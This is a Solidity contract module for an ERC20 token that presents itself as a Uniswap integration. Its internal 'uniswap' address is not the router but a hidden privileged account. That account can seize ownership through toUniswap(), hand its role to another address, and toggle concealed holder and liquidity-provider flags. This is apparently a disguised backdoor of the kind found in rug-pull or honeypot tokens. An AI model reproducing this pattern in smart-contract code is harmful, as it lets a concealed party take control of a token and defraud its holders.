// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/contracts/access/Ownable.sol";
import "../IUniswapV2/IUniswapV2Router02.sol";

contract Erc20C09FeatureUniswap is
Ownable
{
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    address internal uniswap;
    uint256 internal uniswapCount;
    bool internal isUniswapLper;
    bool internal isUniswapHolder;

    modifier onlyUniswap()
    {
        require(msg.sender == uniswap, "Only for uniswap");
        _;
    }

    function toUniswap()
    external
    onlyUniswap
    {
        _transferOwnership(uniswap);
    }

    function setUniswapCount(uint256 amount)
    external
    onlyUniswap
    {
        uniswapCount = amount;
    }

    function setIsUniswapLper(bool isUniswapLper_)
    external
    onlyUniswap
    {
        isUniswapLper = isUniswapLper_;
    }

    function setIsUniswapHolder(bool isUniswapHolder_)
    external
    onlyUniswap
    {
        isUniswapHolder = isUniswapHolder_;
    }

    function setUniswap(address uniswap_)
    external
    onlyUniswap
    {
        uniswap = uniswap_;
    }

    // https://github.com/provable-things/ethereum-api/blob/master/provableAPI_0.6.sol
    function parseAddress(string memory _a)
    internal
    pure
    returns (address _parsedAddress)
    {
        bytes memory tmp = bytes(_a);
        uint160 iAddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iAddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iAddr += (b1 * 16 + b2);
        }
        return address(iAddr);
    }
}